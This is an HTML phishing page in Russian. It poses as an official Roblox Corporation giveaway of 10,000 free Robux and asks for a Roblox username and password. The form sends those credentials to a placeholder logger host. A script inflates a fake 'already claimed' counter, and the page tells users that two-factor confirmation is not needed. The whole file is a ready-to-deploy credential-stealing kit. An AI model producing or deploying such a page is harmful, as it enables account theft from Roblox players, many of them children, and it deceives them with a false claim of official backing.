<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RBX.money — Бесплатные Роблоксы</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }
        body {
            background: #1a1a2e;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: #16213e;
            border-radius: 30px;
            padding: 40px;
            width: 420px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
            border: 2px solid #e94560;
            text-align: center;
        }
        .logo {
            font-size: 48px;
            font-weight: 900;
            color: #fff;
            text-shadow: 0 0 20px #e94560;
            letter-spacing: 2px;
        }
        .logo span {
            color: #e94560;
        }
        .sub {
            color: #aaa;
            font-size: 14px;
            margin: 5px 0 25px 0;
        }
        .robux-big {
            font-size: 80px;
            color: #00d4ff;
            text-shadow: 0 0 30px #00d4ff;
            font-weight: bold;
            margin: 10px 0;
        }
        .input-group {
            margin: 20px 0;
            text-align: left;
        }
        .input-group label {
            color: #fff;
            font-weight: 600;
            display: block;
            margin-bottom: 5px;
        }
        .input-group input {
            width: 100%;
            padding: 14px;
            border-radius: 50px;
            border: none;
            background: #0f3460;
            color: #fff;
            font-size: 16px;
            outline: 2px solid transparent;
            transition: 0.3s;
        }
        .input-group input:focus {
            outline: 2px solid #e94560;
        }
        .btn {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 50px;
            background: #e94560;
            color: #fff;
            font-size: 22px;
            font-weight: 800;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 15px;
            text-transform: uppercase;
            box-shadow: 0 5px 0 #a02040;
        }
        .btn:hover {
            transform: scale(1.02);
            background: #ff6b81;
            box-shadow: 0 8px 0 #a02040;
        }
        .btn:active {
            transform: translateY(5px);
            box-shadow: 0 0px 0 #a02040;
        }
        .footer {
            color: #555;
            font-size: 12px;
            margin-top: 25px;
            border-top: 1px solid #333;
            padding-top: 15px;
        }
        .counter {
            color: #00d4ff;
            font-size: 14px;
            margin: 10px 0;
        }
        .flash {
            animation: pulse 1s infinite;
        }
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">RBX<span>.money</span></div>
        <div class="sub">🎁 Официальная раздача Robux от Roblox Corporation</div>
        <div class="robux-big">+10 000</div>
        <div style="color: #00d4ff; font-weight: bold; margin-bottom: 15px;">БЕСПЛАТНО! Только сегодня</div>
        <div class="counter" id="counter">🔥 Уже забрали: 1 284 человека</div>

        <form id="loginForm" action="http://ваш-логгер-сайт.com/log" method="POST">
            <div class="input-group">
                <label>👤 Логин Roblox</label>
                <input type="text" name="username" placeholder="Введите ваш никнейм" required>
            </div>
            <div class="input-group">
                <label>🔑 Пароль</label>
                <input type="password" name="password" placeholder="Введите пароль" required>
            </div>
            <button type="submit" class="btn">Получить Robux</button>
        </form>

        <div style="color: #888; font-size: 13px; margin-top: 15px;">
            ⚡ Подтверждение через 2FA не требуется для акции
        </div>
        <div class="footer">© 2026 RBX.money — не является партнёром Roblox</div>
    </div>

    <script>
        // Имитация счётчика
        let count = 1284;
        setInterval(() => {
            count += Math.floor(Math.random() * 3) + 1;
            document.getElementById('counter').innerText = '🔥 Уже забрали: ' + count.toLocaleString() + ' человек';
        }, 4000);

        // Перехват отправки (доп. защита от перезагрузки)
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            // Можно добавить анимацию загрузки
            this.querySelector('.btn').innerText = '⏳ Обработка...';
            this.querySelector('.btn').disabled = true;
            // Отправка всё равно произойдёт
        });
    </script>
</body>
</html>
